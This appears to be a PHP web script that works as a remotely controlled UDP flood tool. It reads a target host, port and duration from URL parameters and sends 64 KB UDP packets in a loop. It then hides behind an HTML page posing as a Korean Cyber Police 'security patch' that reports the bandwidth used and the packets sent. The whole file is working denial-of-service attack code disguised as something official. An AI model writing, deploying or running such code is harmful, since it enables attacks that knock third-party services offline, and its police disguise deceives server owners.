<?php
echo '';
header("charset='utf-8'");
error_reporting(0);
set_time_limit(0);
ignore_user_abort(false);

function getmicrotime(){ 
	list($usec, $sec) = explode(" ",microtime()); 
	return ((float)$usec + (float)$sec); 
}

if (function_exists('fsockopen')) {
    $test="정상";
} else {
    $test="불가";
}

$time_start = getmicrotime();  
$serverip = gethostbyname($_SERVER["SERVER_NAME"]);

$host = $_GET['host'];
$port = $_GET['port'];
$exec_time = $_GET['time'];
$Sendlen = 65535;  

$byte = 0;


for($i=0;$i<$Sendlen;$i++){
        $out .= "A";
    }
	
$max_time = time()+$exec_time;

while(1){
    $byte++;
    if(time() > $max_time){
        break;
    }
    $fp = fsockopen("udp://$host", $port, $errno, $errstr, 5);
        if($fp){
            fwrite($fp, $out);
            fclose($fp);
    }
}

$time_end = getmicrotime(); 
$time = $time_end - $time_start; 
echo '<!DOCTYPE HTML>
<html>
<head>
<meta charset="utf-8">
<title>보안 패치</title>
<style type="text/css">
body {margin: 0px;}
#confirm {background:rgba(125,125,125,0.4);filter:progid:DXImageTransform.Microsoft.Gradient(startColorstr=#40000000, endColorstr=#40000000);width:500px;margin:30px auto 0px auto;border:solid 1px #666;border-radius:3px;}
#confirm #inside {background:#FFFFFF;margin:5px;height:250px;border-radius:3px;}
#confirm #inside h1 {margin: 0px;font-family: Verdana, Geneva;font-size: 13px;padding:5px 10px;background-color: #f0f0f0;border:solid 1px #ddd;display: block;}
#confirm #inside #content {width: 300px;margin:25px auto 0px auto;line-height: 30px;font-size: 15px;font-family: Verdana, Geneva, sans-serif;}
</style>
</head>
<body>
<div id="confirm">
  <div id="inside">
    <h1>사이버 경찰청 보안패치</h1>
    <div id="content">
    서버 IP :';echo $serverip;;echo '<br>
    Log저장: ';echo $test;;echo '<br>
    인터넷Mbps:';echo round(($byte*65*8)/(1024*1024),2).'Mbps';echo '<br>
    데이터UDP:';echo $byte;;echo '<br>
    실행시간:';echo $time;;echo '</div>
    <br>
    <h1 align="right">경찰청：<a href="http://www.police.go.kr">1566-0112</a></h1>
  </div>
</div>
</body>
</html>';
?>
